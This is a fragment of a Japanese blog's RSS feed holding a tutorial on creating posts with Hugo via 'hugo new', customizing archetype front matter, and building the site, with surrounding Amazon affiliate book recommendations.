&lt;a href="https://www.amazon.co.jp/%e6%94%b9%e8%a8%822%e7%89%88-%e3%82%8f%e3%81%8b%e3%81%b0%e3%81%a1%e3%82%83%e3%82%93%e3%81%a8%e5%ad%a6%e3%81%b6-Git%e4%bd%bf%e3%81%84%e6%96%b9%e5%85%a5%e9%96%80%e3%80%88GitHub%e3%80%81SourceTree%e3%80%81%e3%82%b3%e3%83%9e%e3%83%b3%e3%83%89%e6%93%8d%e4%bd%9c%e5%af%be%e5%bf%9c%e3%80%89-%e6%b9%8a%e5%b7%9d-%e3%81%82%e3%81%84/dp/4863543433/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51ITQMzMG2L.jpg" alt=" 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 &lt;/h2>
&lt;p> マンガと実践で学ぶGitの入門書が最新情報に対応して改訂しました! Gitの概念はもちろん、GitHubについても丁寧に解説しています。これからGitを使い始める人にオススメの1冊です。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%81%84%e3%81%a1%e3%81%b0%e3%82%93%e3%82%84%e3%81%95%e3%81%97%e3%81%84Git-GitHub%e3%81%ae%e6%95%99%e6%9c%ac-%e4%ba%ba%e6%b0%97%e8%ac%9b%e5%b8%ab%e3%81%8c%e6%95%99%e3%81%88%e3%82%8b%e3%83%90%e3%83%bc%e3%82%b8%e3%83%a7%e3%83%b3%e7%ae%a1%e7%90%86-%e5%85%b1%e6%9c%89%e5%85%a5%e9%96%80-%e3%80%8c%e3%81%84%e3%81%a1%e3%81%b0%e3%82%93%e3%82%84%e3%81%95%e3%81%97%e3%81%84%e6%95%99%e6%9c%ac%e3%80%8d%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba/dp/429500524X/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51XKtp0hjmL.jpg" alt=" いちばんやさしいGit&amp;amp;GitHubの教本 人気講師が教えるバージョン管理&amp;amp;共有入門 (「いちばんやさしい教本」シリーズ) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> いちばんやさしいGit&amp;amp;GitHubの教本 人気講師が教えるバージョン管理&amp;amp;共有入門 (「いちばんやさしい教本」シリーズ) &lt;/h2>
&lt;p> 実際のワークフローをイメージしながら 実践的なGit/GitHubの使い方が身につく「いちばんやさしい」入門書です。 前半は、手元のパソコンでファイルを実際にバージョン管理しながら、 Gitの基本的な使い方を解説。 後半では、実践的なワークフローに沿ってGitHubを使い、 チームメンバーと一緒に開発を進めるための知識が身につきます。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>Hugoで記事を投稿してみよう！Hugoでの記事投稿の仕方。</title><link>https://suzukiiichiro.github.io/posts/2021-12-21-01/</link><pubDate>Tue, 21 Dec 2021 18:08:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-21-01/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-21-01/2021-12-21-1.jpg" alt="Featured image of post Hugoで記事を投稿してみよう！Hugoでの記事投稿の仕方。" />&lt;h2 id="記事を投稿する">記事を投稿する&lt;/h2>
&lt;p>hugoで記事を作成して、投稿するためには専用のコマンドを使ってファイルを作成するか、postsなどのディレクトリにmarkdownの.mdファイルを設置する必要があります。&lt;br>
今回はhugoでの記事の投稿の仕方を説明いたします。&lt;/p>
&lt;h2 id="hugo-newで記事を投稿">hugo newで記事を投稿&lt;/h2>
&lt;p>HUGOで記事を投稿するには、専用のコマンド &lt;code>hugo new&lt;/code> を使う必要があります。&lt;/p>
&lt;p>このコマンドを実行すると、提供されたパスに基づいて作成するファイルの種類を推測し、新しいコンテンツファイルを作成して日付とタイトルを自動的に設定します。&lt;/p>
&lt;p>&lt;code>-k KIND&lt;/code> で種類を指定することもできます。&lt;/p>
&lt;p>テーマまたはサイトでアーキタイプが提供されている場合は、それらが使用されます。&lt;br>
これは、サイトのルートディレクトリ内で実行してください。&lt;/p>
&lt;pre tabindex="0">&lt;code>hugo new [path] [flags]
&lt;/code>&lt;/pre>&lt;p>postsというディレクトリにファイルを作成する場合は以下のようになります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">$ hugo new posts/&lt;span class="o">[&lt;/span>ファイル名&lt;span class="o">]&lt;/span>.md
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このファイルを開いてみてみると、&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">---
title: &amp;#34;Test&amp;#34;
date: [作成日時]
draft: true
---
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このようなファイルが作成されているかと思います。ファイルの中身の構成は下記のようになります。&lt;/p>
&lt;ul>
&lt;li>title: 記事のタイトル&lt;/li>
&lt;li>date: 記事の作成日&lt;/li>
&lt;li>draft: 下書きかどうか&lt;/li>
&lt;/ul>
&lt;p>&lt;code>draft: false&lt;/code> にする事でドラフトを公開にすることができる&lt;/p>
&lt;p>上記のような作成ファイルの他に、HUGOにはさまざまな情報を &lt;strong>Params&lt;/strong> として付与することが可能です&lt;br>
新規作成した際にできるファイルの初期値を変えたい場合はどうしたらいいでしょうか？&lt;/p>
&lt;h2 id="hugo-newをカスタマイズする">hugo newをカスタマイズする&lt;/h2>
&lt;p>&lt;code>hugo new&lt;/code> した際にできるファイルの初期値を変えるには、&lt;/p>
&lt;ul>
&lt;li>archetypes/posts.md&lt;/li>
&lt;li>archetypes/default.md&lt;/li>
&lt;/ul>
&lt;p>などのファイルを修正してやることで可能です。&lt;/p>
&lt;p>実際にファイルを見てみると初期状態では下記のようになっていました。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown:archetypes/default.md" data-lang="markdown:archetypes/default.md">---
title: &amp;#34;{{ replace .Name &amp;#34;-&amp;#34; &amp;#34; &amp;#34; | title }}&amp;#34;
date: {{ .Date }}
draft: true
---
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ではここに、画像やカテゴリのフィールドを追加してみましょう。&lt;br>
さきほどのを開いて、編集します。&lt;br>
今回はキャッチ画像とカテゴリを追加するので、imageとcategoriesを追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown:archetypes/default.md" data-lang="markdown:archetypes/default.md">---
title: &amp;#34;{{ replace .Name &amp;#34;-&amp;#34; &amp;#34; &amp;#34; | title }}&amp;#34;
date: {{ .Date }}
draft: true
image: &amp;#34;&amp;#34;
categories:
&lt;span class="k">-&lt;/span> カテゴリ名
---
&lt;/code>&lt;/pre>&lt;/div>&lt;p>この状態でファイルを保存して、&lt;code>hugo new&lt;/code> で新規作成して見ましょう。&lt;br>
すると、初期状態のファイルではなかったimageとcategoriesの項目が追加されているかと思います。&lt;br>
さらに、categoriesには「カテゴリ名」というカテゴリも反映されているかと思います。このように、初期値を調整することが可能なのです。&lt;/p>
&lt;p>これを応用すると、初期状態を&lt;strong>下書き&lt;/strong>ではなく、&lt;strong>公開&lt;/strong>状態でファイルを新規作成することも可能です。&lt;/p>
&lt;h2 id="公開用ビルドする">公開用ビルドする&lt;/h2>
&lt;p>さて、記事がかけたところで、サイトを公開しようといたしましょう。&lt;/p>
&lt;p>残念なことに、hugoで作成したファイルはmarkdown形式であるために、そのままではwebページに公開できません。&lt;br>
作成したファイルを静的HTMLとして書き出し、ビルド（構築）する必要があるのです。&lt;br>
ビルドは一瞬で終わってしまうのがhugoのすごいところです。&lt;/p>
&lt;p>hugoで作成したファイルをビルドするためのコマンドが以下になります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">$ hugo
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上記のコマンドを実行することで、&lt;code>public&lt;/code>ディレクトリにHTMファイルが生成されます。&lt;br>
実行した際に、サイトの情報も表示されているので、合わせて確認するとなにか新しい発見があるかもしれません。&lt;/p>
&lt;pre tabindex="0">&lt;code>Start building sites …
hugo v0.91.0+extended darwin/amd64 BuildDate=unknown
| JA
-------------------+------
Pages | 185
Paginator pages | 42
Non-page files | 205
Static files | 9
Processed images | 620
Aliases | 56
Sitemaps | 1
Cleaned | 0
Total in 981 ms
&lt;/code>&lt;/pre>&lt;p>さて、publicディレクトリのファイルをサーバにアップすることでサイトが公開できるということになります。&lt;/p>
&lt;h2 id="オススメの書籍">オススメの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/Markdown%e3%83%a9%e3%82%a4%e3%83%86%e3%82%a3%e3%83%b3%e3%82%b0%e5%85%a5%e9%96%80-%e3%83%97%e3%83%ac%e3%83%bc%e3%83%b3%e3%83%86%e3%82%ad%e3%82%b9%e3%83%88%e3%81%a7%e6%b0%97%e6%a5%bd%e3%81%ab%e6%9b%b8%e3%81%93%e3%81%86%ef%bc%81-%e6%8a%80%e8%a1%93%e3%81%ae%e6%b3%89%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba%ef%bc%88NextPublishing%ef%bc%89-%e8%97%a4%e5%8e%9f-%e6%83%9f/dp/4844398369/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/514KHlwilvL.jpg" alt=" Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) &lt;/h2>
&lt;p> 【プレーンテキストでらくらくライティング! Markdownを使いこなそう! 】 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 〈本書の対象読者〉 執筆のストレスを減らして集中したい人 PCが古くて軽いアプリで執筆したい人 いろいろなアプリで原稿を使いまわしたい人 思いついた時にスマホでメモ書きして原稿にまとめたい人 続きを読む 。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item></channel></rss>